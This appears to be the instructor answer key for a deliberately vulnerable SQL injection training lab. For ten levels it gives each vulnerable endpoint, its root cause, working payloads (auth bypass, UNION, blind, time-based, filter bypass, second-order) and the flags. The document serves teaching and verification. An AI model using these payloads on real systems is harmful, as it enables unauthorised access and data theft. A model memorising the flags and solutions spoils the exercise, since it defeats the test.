# SOLUTIONS.md — Instructor / Verification Reference

This file contains full solutions for every level: the vulnerable endpoint,
root cause, relevant query, exploitation concept, an example payload, and
the flag. It exists for instructors, lab authors, and automated
verification — **players should solve the levels without reading this
file.**

All flags below match `app/database.py::FLAGS` exactly.

---

## Level 1 — Basic Authentication SQL Injection

- **Endpoint:** `POST /level1`
- **Root cause:** `username`/`password` are concatenated directly into the
  query string with no parameterization (`app/levels/level1.py`).
- **Query:**
  ```sql
  SELECT * FROM level1_users WHERE username = '<username>' AND password = '<password>'
  ```
- **Concept:** classic authentication-bypass injection — close the
  username string early and comment out the rest of the query so the
  password check never executes.
- **Example payload:** `username = admin'--`, `password = anything`
  Resulting query: `... WHERE username = 'admin'--' AND password = 'anything'`
  → everything after `--` is a comment, so the row for `admin` is returned
  regardless of password.
- **Flag:** `FLAG{auth_bypass_1s_ju5t_th3_b3g1nn1ng}`

---

## Level 2 — UNION-based SQL Injection

- **Endpoint:** `GET /level2?q=`
- **Root cause:** `q` is concatenated into a `LIKE` clause
  (`app/levels/level2.py`).
- **Query:**
  ```sql
  SELECT name, description, price FROM level2_products WHERE name LIKE '%<q>%'
  ```
- **Concept:** the query selects exactly 3 columns. A `UNION SELECT` with 3
  matching columns from another table (`level2_secret_flags`, named in the
  level description) will be merged into the same result set.
- **Example payload:**
  `q = zzzzz' UNION SELECT flag_value, flag_value, 1 FROM level2_secret_flags--`
- **Flag:** `FLAG{uni0n_s3l3ct_l1ke_a_pr0}`

---

## Level 3 — Database Enumeration

- **Endpoint:** `GET /level3?q=`
- **Root cause:** same concatenation flaw as Level 2, 2 columns this time,
  but the target table name is not given.
- **Query:**
  ```sql
  SELECT name, category FROM level3_products WHERE category = '<q>'
  ```
- **Concept:** SQLite has no `information_schema`; table/column names live
  in `sqlite_master`. Enumerate first, then pivot.
- **Example payloads:**
  1. `q = zzzz' UNION SELECT name, sql FROM sqlite_master--`
     → reveals `level3_secret_vault(id, secret_name, secret_value)`
  2. `q = zzzz' UNION SELECT secret_name, secret_value FROM level3_secret_vault--`
- **Flag:** `FLAG{enum3r4t10n_unlocks_s3cr3ts}`

---

## Level 4 — Hidden Output

- **Endpoint:** `GET /level4?id=`
- **Root cause:** `id` is concatenated directly, and the app appends its
  own `AND visible = 1` clause server-side (`app/levels/level4.py`).
- **Query:**
  ```sql
  SELECT title, note FROM level4_items WHERE id = <id> AND visible = 1
  ```
- **Concept:** the appended clause can be neutralized with a trailing
  comment, or overridden with a always-true `OR`, so the row with
  `visible = 0` (which holds the flag in its `note` column) is returned.
- **Example payload:** `id = 0 OR 1=1--`
  → `... WHERE id = 0 OR 1=1--  AND visible = 1` (comment removes the
  trailing `visible` check), returning every row including the hidden one.
- **Flag:** `FLAG{r34d_th3_qu3ry_n0t_th3_scr33n}`

---

## Level 5 — Boolean-based Blind SQL Injection

- **Endpoint:** `GET /level5?username=`
- **Root cause:** `username` concatenated into a `WHERE` clause; only a
  generic found/not-found message is ever returned, no row data or errors
  (`app/levels/level5.py`).
- **Query:**
  ```sql
  SELECT id FROM level5_users WHERE username = '<username>'
  ```
- **Concept:** inject a boolean sub-condition; "found" vs "not found"
  reveals whether the condition was true. Iterate over each character
  position with `SUBSTR()` and a binary/linear search over characters to
  reconstruct `secret_flag`.
- **Example payloads:**
  - Confirm channel works: `username = targetuser' AND '1'='1` → found
  - Extract first character: `username = x' OR (SELECT substr(secret_flag,1,1) FROM level5_users)='F'--`
  - Repeat for each position/character until the full flag is reconstructed.
- **Flag:** `FLAG{bl1nd_but_n0t_d3af_b00l34n}`

---

## Level 6 — Time-based Blind SQL Injection

- **Endpoint:** `GET /level6?username=`
- **Root cause:** identical concatenation flaw to Level 5, but the response
  text never differs between true/false — only timing does
  (`app/levels/level6.py`). Response time in ms is shown on the page to
  make the timing channel legible for learning purposes.
- **Query:**
  ```sql
  SELECT id FROM level6_users WHERE username = '<username>'
  ```
- **Concept:** SQLite has no `SLEEP()`. A conditionally-expensive
  subquery (recursive CTE or large cartesian join) achieves the same
  effect: a measurable delay only when the injected condition is true.
- **Example payload (works regardless of underlying table size):**
  ```
  username = x' OR (WITH RECURSIVE r(x) AS (VALUES(1) UNION ALL SELECT x+1 FROM r WHERE x<8000000) SELECT count(*) FROM r)>0--
  ```
  This adds roughly 1.5s of delay when the condition evaluates; compare
  against a payload built around a false condition (e.g. `x<1`) to
  calibrate the baseline, then apply the same technique character-by-character
  against `secret_flag`, as in Level 5, using elapsed time instead of the
  found/not-found message as the oracle.
- **Flag:** `FLAG{t1m3_1s_4ls0_4_ch4nn3l}`

---

## Level 7 — Filtered SQL Injection

- **Endpoint:** `POST /level7`
- **Root cause:** `app/levels/level7.py` blocks a hardcoded, **case-sensitive**
  blacklist: `["union", "select", "--", "or ", " or", "sleep"]`, checked
  against the raw (non-lowercased) input.
- **Query:**
  ```sql
  SELECT * FROM level7_users WHERE username = '<username>' AND password = '<password>'
  ```
- **Concept:** the filter only matches lowercase keywords, so uppercase
  (or mixed-case) equivalents pass straight through untouched.
- **Example payload:** `username = x`, `password = x' OR '1'='1`
  (uppercase `OR` bypasses the lowercase-only blacklist entry `"or "`)
  Resulting logic: `(username='x' AND password='x') OR '1'='1'` → always
  true, returns every row including `admin`.
- **Flag:** `FLAG{f1lt3rs_4r3_n0t_p4rs3rs}`

---

## Level 8 — WAF Bypass

- **Endpoint:** `POST /level8`
- **Root cause:** `app/levels/level8.py` strips `"union"` and `"select"`
  (case-insensitively) from the input, but only **once**, non-recursively,
  via `re.sub(kw, "", value, count=1, ...)`.
- **Query:**
  ```sql
  SELECT * FROM level8_users WHERE username = '<filtered_username>' AND password = '<filtered_password>'
  ```
- **Concept (classic WAF bug):** because the keyword is removed once and
  the result isn't re-scanned, wrapping a keyword inside itself survives:
  `"UNIunionON"` → removing `"union"` once leaves `"UNION"` behind. More
  simply for this level, since only `union`/`select` are stripped (not
  `or`), a direct boolean injection also works unfiltered.
- **Example payloads:**
  - Simple: `password = x' OR '1'='1` (the filter doesn't touch `OR`
    at all, demonstrating that removing specific keywords ≠ sanitizing
    input generally)
  - Keyword-reconstruction variant, for practicing the "self-healing
    keyword" technique directly: `UNIunionON SEselectLECT` survives
    `naive_filter()` as `UNION SELECT`.
- **Flag:** `FLAG{w4f_n0rm4l1z4t10n_f41ls}`

---

## Level 9 — Second-order SQL Injection

- **Endpoints:** `POST /level9` (register), `POST /level9/process` (batch job)
- **Root cause:** `register_username()` uses a parameterized query and is
  safe. `process_pending_signups()` later reads the stored value back out
  of the database and concatenates it — unsanitized — into a new query
  (`app/levels/level9.py`).
- **Queries:**
  ```sql
  -- Step 1 (safe):
  INSERT INTO level9_pending_signups (username) VALUES (?)

  -- Step 2 (vulnerable, runs later on stored data):
  SELECT username, bio FROM level9_profiles WHERE username = '<stored_username>'
  ```
- **Concept:** the injection point and the injection *execution* are in
  different requests/operations entirely. Register a username that is
  itself a UNION payload; nothing happens at registration time (it's just
  stored as a string). Triggering "Process Pending Signups" later executes
  it against `level9_profiles`, which holds this level's flag inside the
  `system` user's `bio`.
- **Example payload (as the registered username):**
  ```
  nonexistent' UNION SELECT username, bio FROM level9_profiles WHERE username='system
  ```
- **Flag:** `FLAG{st0r3d_t0d4y_3x3cut3d_l4t3r}`

---

## Level 10 — Advanced Combined Challenge

- **Endpoints:** `POST /level10` (login), `GET /level10/search` (session-gated)
- **Root cause:** both `login()` and `search_products()` in
  `app/levels/level10.py` concatenate input directly. `search_products()`
  has a blacklist blocking `drop `, `insert `, `update `, `delete `, `--;`
  (but not plain `--`, `union`, `select`, or `or`), and shows raw SQL
  errors, making it enumerable.
- **Queries:**
  ```sql
  -- Step 1 (auth bypass):
  SELECT * FROM level10_users WHERE username = '<username>' AND password = '<password>'

  -- Step 2 (session-gated, filtered search):
  SELECT name, code FROM level10_products WHERE code = '<code>'
  ```
- **Concept:** chain multiple techniques across two endpoints —
  1. Bypass login (same technique as Level 1) to obtain a session.
  2. Use the now-accessible `search` endpoint, which is UNION-injectable
     and shows SQL errors, to enumerate `sqlite_master` for a table
     unrelated to products.
  3. Pull the flag out of that table via UNION.
- **Example payloads:**
  1. Login: `username = boss'--`, `password = anything`
  2. Enumerate: `code = zzz' UNION SELECT name, sql FROM sqlite_master WHERE type='table` — reveals `level10_vault(id, label, value)`
  3. Extract: `code = zzz' UNION SELECT label, value FROM level10_vault--`
- **Flag:** `FLAG{ch41n3d_st3ps_t0_full_c0mpr0m1s3}`

---

## Verification checklist (all confirmed against a running instance)

| Level | Endpoint(s) tested | Result |
|---|---|---|
| 1 | `POST /level1` | ✅ flag retrieved |
| 2 | `GET /level2` | ✅ flag retrieved |
| 3 | `GET /level3` (x2 requests: enumerate, then extract) | ✅ flag retrieved |
| 4 | `GET /level4` | ✅ flag retrieved |
| 5 | `GET /level5` (true/false/char-guess requests) | ✅ oracle behaves correctly |
| 6 | `GET /level6` (baseline vs. delayed request) | ✅ ~0.01s baseline vs. ~1.5s delayed |
| 7 | `POST /level7` (blocked attempt, then bypass) | ✅ lowercase blocked, uppercase bypass works |
| 8 | `POST /level8` | ✅ flag retrieved |
| 9 | `POST /level9` then `POST /level9/process` | ✅ flag retrieved |
| 10 | `POST /level10` → `GET /level10/search` (x2) | ✅ full chain works |
| — | `POST /reset` | ✅ wipes DB, re-seeds, level 1 exploit still works after reset |
| — | `POST /submit-flag/<n>` | ✅ correct flag marks complete, wrong flag does not |
| — | `/progress`, `/logs`, `/`, `/static/style.css` | ✅ all return 200 |
